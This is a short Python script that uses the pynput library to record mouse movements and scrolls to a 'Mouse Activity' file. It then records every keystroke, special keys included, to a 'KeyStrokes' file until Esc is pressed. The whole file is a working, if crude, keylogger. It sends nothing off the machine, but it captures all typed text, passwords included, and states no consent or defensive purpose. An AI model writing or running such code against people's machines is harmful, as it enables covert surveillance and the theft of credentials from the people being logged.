from UsefulPyFunc import write_file


from pynput import mouse

def on_move(x, y):
    print('Pointer moved to {0}'.format(
        (x, y)))
    write_file("Mouse Activity", "(" + format(
        (x, y)) + ") " )

def on_click(x, y, button, pressed):
    print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))

    # write_file("Mouse Activity","(" + format(
    #     'Pressed' if pressed else 'Released',
    #     (x, y))  )
    if not pressed:
        # Stop listener
        return False

def on_scroll(x, y, dx, dy):
    print('Scrolled {0}'.format(
        (x, y)))
    write_file("Mouse Activity", '(Scrolled {0}'.format(
        (x, y)) + ")" )

# Collect events until released
with mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll) as listener:
    listener.join()





from pynput import keyboard

def on_press(key):
    try:
        # print('alphanumeric key {0} pressed'.format(
            # key.char))

        write_file("KeyStrokes", format(
            key.char) )
    except AttributeError:
        # print('special key {0} pressed'.format(
            # key))

        write_file("KeyStrokes", " (" +format(
            key) + ") " )

def on_release(key):
    # print('{0} released'.format(
        # key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()